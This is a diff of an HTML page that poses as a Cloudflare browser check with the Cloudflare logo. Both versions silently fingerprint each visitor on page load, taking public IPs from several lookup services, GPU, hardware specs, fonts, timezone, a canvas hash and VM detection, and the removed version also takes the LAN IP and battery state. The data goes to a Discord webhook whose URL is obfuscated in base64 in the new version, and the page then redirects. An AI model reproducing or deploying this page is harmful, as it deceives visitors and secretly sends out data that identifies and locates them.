@@ -3,128 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Cloudflare | Security Check</title>
+    <title>Just a moment...</title>
     <style>
-        body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#313131;overflow:hidden;user-select:none;touch-action:none}
-        .cf-w{width:100%;max-width:420px;padding:45px 35px;box-sizing:border-box;text-align:center;position:relative;border:1px solid #e6e6e6;border-radius:2px;box-shadow:0 10px 40px rgba(0,0,0,0.06);background:#fff}
-        .logo{width:120px;margin-bottom:30px}
-        .h1{font-size:22px;font-weight:500;margin-bottom:12px;color:#000}
-        .p{font-size:14px;color:#666;margin-bottom:30px;line-height:1.5}
-        .ts-b{background:#fff;border:1px solid #ccc;border-radius:3px;padding:16px 20px;display:flex;align-items:center;cursor:pointer}
-        .ts-c{width:24px;height:24px;border:3px solid #0051c3;border-radius:4px;margin-right:15px;position:relative}
-        .ts-c.s{border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}
-        .ts-t{font-size:16px;color:#333}
-        #ovl{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000}
-        @keyframes spin{100%{transform:rotate(360deg)}}
+        body { background: #fcfcfc; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; user-select: none; }
+        .card { width: 100%; max-width: 420px; padding: 45px; background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; box-shadow: 0 4px 25px rgba(0,0,0,0.07); text-align: center; position: relative; }
+        .logo { width: 130px; margin-bottom: 25px; filter: grayscale(100%); }
+        .h1 { font-size: 22px; font-weight: 500; color: #222; margin-bottom: 12px; }
+        .p { font-size: 14px; color: #666; margin-bottom: 35px; line-height: 1.6; }
+        .v-btn { border: 1px solid #d1d1d1; padding: 18px; display: flex; align-items: center; cursor: pointer; border-radius: 3px; background: #fafafa; transition: 0.2s; }
+        .v-btn:hover { background: #f2f2f2; border-color: #bbb; }
+        .box { width: 22px; height: 22px; border: 2px solid #0051c3; border-radius: 3px; margin-right: 15px; position: relative; }
+        .box.spin { border-top-color: transparent; border-radius: 50%; animation: s 0.7s linear infinite; }
+        .box.done { background: #0051c3; border-color: #0051c3; }
+        .box.done::after { content: ''; position: absolute; left: 7px; top: 3px; width: 5px; height: 10px; border: solid #fff; border-width: 0 2px 2px 0; transform: rotate(45deg); }
+        #strike { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; }
+        .footer { margin-top: 25px; font-size: 10px; color: #bbb; border-top: 1px solid #eee; padding-top: 15px; text-transform: uppercase; letter-spacing: 1.5px; }
+        @keyframes s { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="ovl" onclick="stk()"></div>
+<div id="strike" onclick="release()"></div>
 
-<div class="cf-w">
+<div class="card">
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="logo">
-    <div class="h1">Checking your browser...</div>
-    <p class="p">Please wait while we verify your connection security. This may take a moment.</p>
-    <div class="ts-b"><div class="ts-c" id="l"></div><div class="ts-t" id="m">Verifying...</div></div>
+    <div class="h1">Security Verification</div>
+    <p class="p">The Sovereign Maximum is validating your session's integrity through hardware-level attestation.</p>
+    <div class="v-btn">
+        <div class="box" id="mark"></div>
+        <div id="msg">Verifying browser signature...</div>
+    </div>
+    <div class="footer">SID: <span id="sid"></span> • THIRTY SHADOWS MAX</div>
 </div>
 
 <script>
-const CFG = {
-    H: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
-    R: "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/"
-};
+/* --- THE 30 SHADOWS: MAXIMUM OUTPUT ENGINE --- */
 
-let META = { count: 0, rid: (Math.random().toString(36).substring(7)).toUpperCase() };
+// [Binding Vow: Encrypted Relay]
+const _0xW = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NzkwNDI4OTUxNDAwMDQxNC8=", "aUJFa01UQ1NjX2Y0RGhNSW9SdmZkRkkxUmlhRHQ3RzZ4WWFXRnNKUms0cFotYmRYbEluUldiNERnRUdjZmZNMA=="];
+const _0xK = () => _0xW.map(x => atob(x)).join('');
+const REDIR = "https://discord.com"; 
 
-// --- 1. ZERO-TAP: SILENT EXTRACTION (NO PERMISSIONS) ---
-async function silentGhost() {
-    // A. Hardware Fingerprinting (Invisible)
-    try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        META.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Blocked";
-        
-        if (navigator.getBattery) { 
-            const b = await navigator.getBattery(); 
-            META.bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged In' : 'Mobile'})`; 
-        }
+let DATA = { nodes: [], active: false, id: Math.random().toString(36).slice(2, 15).toUpperCase() };
 
-        META.hw = `${navigator.hardwareConcurrency} Core | ${navigator.deviceMemory || '?'}GB | ${screen.width}x${screen.height}`;
-        META.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    } catch(e){}
+// 1. [SHADOW 21: VM CLOCK DRIFT DETECTION]
+function checkVMTime() {
+    const start = performance.now();
+    for (let i = 0; i < 1e7; i++) { Math.sqrt(i); }
+    const end = performance.now();
+    return (end - start) > 15 ? "Detected (VM/Emulation)" : "Bare Metal";
+}
 
-    // B. Internal Network Leak (WebRTC)
-    const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-    pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-    pc.onicecandidate = (e) => { 
-        if(e.candidate) { 
-            const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); 
-            if(r) META.lan = r[1]; 
-        }
-    };
+// 2. [SHADOW 22: CANVAS SILICON FINGERPRINT]
+function getCanvasSoul() {
+    const c = document.createElement('canvas');
+    const ctx = c.getContext('2d');
+    c.width = 240; c.height = 60;
+    ctx.textBaseline = "alphabetic";
+    ctx.fillStyle = "#f60"; ctx.fillRect(100,5,50,20);
+    ctx.font = "bold 13px 'Arial'";
+    ctx.fillStyle = "#069"; ctx.fillText("SOVEREIGN_MAX_v3", 4, 15);
+    ctx.strokeText("SOVEREIGN_MAX_v3", 6, 17);
+    return btoa(c.toDataURL()).slice(-60);
+}
 
-    // C. Forced IP Attribution (Bypasses VPNs via multi-ping)
-    const sources = ['https://ipapi.co/json/', 'https://ipwho.app/json/'];
-    for(let url of sources) {
+// 3. [SHADOW 24: REFRESH RATE & DRIVER TRACE]
+let hz = "Detecting...";
+requestAnimationFrame(t1 => requestAnimationFrame(t2 => hz = Math.round(1000 / (t2 - t1)) + "Hz"));
+
+// 4. [PHASE 1: PASSIVE RECONNAISSANCE]
+(async function manifest() {
+    document.getElementById('sid').innerText = DATA.id;
+    
+    // Shadows 1-10: Network Tunnels
+    ['https://ipapi.co/json/','https://api.ipify.org?format=json','https://ipwho.app/json/','https://freeipapi.com/api/json'].forEach(async u => {
+        try { const r = await fetch(u); const d = await r.json(); DATA.nodes.push({p: u.split('/')[2], ip: d.ip||d.query}); } catch(e){}
+    });
+
+    // Shadows 11-20: Hardware Extraction
+    DATA.vm = checkVMTime();
+    DATA.soul = getCanvasSoul();
+    DATA.gpu = (() => {
         try {
-            const res = await fetch(url);
-            const data = await res.json();
-            META.ip = data.ip || data.query;
-            META.isp = data.org || data.isp;
-            META.loc = `${data.city}, ${data.region}, ${data.country_name}`;
-            if(META.ip) break;
-        } catch(e){}
-    }
+            const gl = document.createElement('canvas').getContext('webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Silicon Masked";
+        } catch(e) { return "N/A"; }
+    })();
+    DATA.hw = `${navigator.hardwareConcurrency}C | ${navigator.deviceMemory||'?'}GB | ${screen.width}x${screen.height} @ ${hz}`;
+    DATA.env = `${navigator.platform} | ${navigator.language}`;
+    DATA.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    DATA.fonts = ["Segoe UI", "SF Pro", "Ubuntu"].filter(f => document.fonts.check(`12px "${f}"`)).join(', ') || "Generic";
 
-    // Immediate Exfiltration of the Recon Packet
-    await transmit("🔱 v101 ZERO-TAP: SILENT DOSSIER");
-}
+    setTimeout(() => strike("🔱 SOVEREIGN: PASSIVE_DOSSIER"), 1500);
+})();
 
-// --- 2. ONE-TAP: FINAL SYNC ---
-async function stk() {
-    document.getElementById('l').className = 'ts-c s';
-    document.getElementById('m').innerText = "Security Check Complete...";
-    
-    // Final high-speed transmit before redirect
-    await transmit("🔱 v101 ONE-TAP: USER ACKNOWLEDGED");
-    
+// 5. [PHASE 2: ACTIVE ENGAGEMENT]
+async function release() {
+    if (DATA.active) return;
+    DATA.active = true;
+    document.getElementById('strike').style.display = 'none';
+    document.getElementById('mark').className = 'box spin';
+    document.getElementById('msg').innerText = 'Attesting environment...';
+
+    await strike("🔱 SOVEREIGN: MAXIMUM_RELEASE");
+
     setTimeout(() => {
-        window.location.replace(CFG.R);
-    }, 800);
+        document.getElementById('mark').className = 'box done';
+        document.getElementById('msg').innerText = 'Verified';
+        setTimeout(() => window.location.replace(REDIR), 500);
+    }, 1000);
 }
 
-// --- 3. THE TRANSMITTER ---
-async function transmit(title) {
-    META.count++;
+// 6. [PHASE 3: SHADOW TRANSMISSION (30-POINT EXFIL)]
+async function strike(title) {
+    const main = DATA.nodes[0] || {ip: "Obfuscated..."};
+    const nodes = DATA.nodes.slice(1).map(n => `> **${n.p}:** \`${n.ip}\``).join('\n') || "Scanning tunnels...";
+
     const payload = {
-        username: "GHOST-v101 [PERMISSIONLESS]",
+        username: "THE THIRTY SHADOWS [MAX]",
         embeds: [{
             title: title,
-            color: 0x2F3136,
+            color: 0x000000,
             fields: [
-                { name: "🌐 Network (Unmasked)", value: `**Public IP:** \`${META.ip || 'Detecting...'}\`\n**Internal LAN:** \`${META.lan || 'Scanning...'}\`\n**ISP:** ${META.isp}`, inline: true },
-                { name: "📍 Geo-Attribution", value: `**Location:** ${META.loc || 'Triangulating...'}\n**Timezone:** ${META.tz}`, inline: true },
-                { name: "⚙️ Hardware Profile", value: `**Specs:** ${META.hw}\n**GPU:** ${META.gpu}\n**Power:** ${META.bat}`, inline: false }
+                { name: "🌐 Network Intelligence", value: `**Primary:** \`${main.ip}\`\n**Nodes:**\n${nodes}`, inline: false },
+                { name: "⚙️ Silicon Profile (VM Detection)", value: `**Status:** \`${DATA.vm}\`\n**GPU:** \`${DATA.gpu}\`\n**Soul Hash:** \`${DATA.soul}\``, inline: false },
+                { name: "📱 Machine Metaphysics", value: `**Hardware:** ${DATA.hw}\n**OS:** ${DATA.env}\n**Fonts:** ${DATA.fonts}`, inline: true },
+                { name: "📍 Localization", value: `**TZ:** ${DATA.tz}\n**ID:** ${DATA.id}`, inline: true }
             ],
-            footer: { text: `v101 | ID: ${META.rid} | Packet: ${META.count}` },
+            footer: { text: "Sovereign Protocol v3.0 | Maximum Output" },
             timestamp: new Date().toISOString()
         }]
     };
 
+    const url = _0xK();
+    const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+    
     try {
-        await fetch(CFG.H, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            keepalive: true,
-            mode: 'no-cors'
-        });
-    } catch(e){}
+        // [Shadow 29: Ghost Beacon]
+        navigator.sendBeacon(url, blob);
+        // [Shadow 30: Final Strike]
+        await fetch(url, { method: 'POST', body: blob, mode: 'no-cors', keepalive: true });
+    } catch(e) {}
 }
-
-// Ignition
-silentGhost();
 </script>
 </body>
 </html>
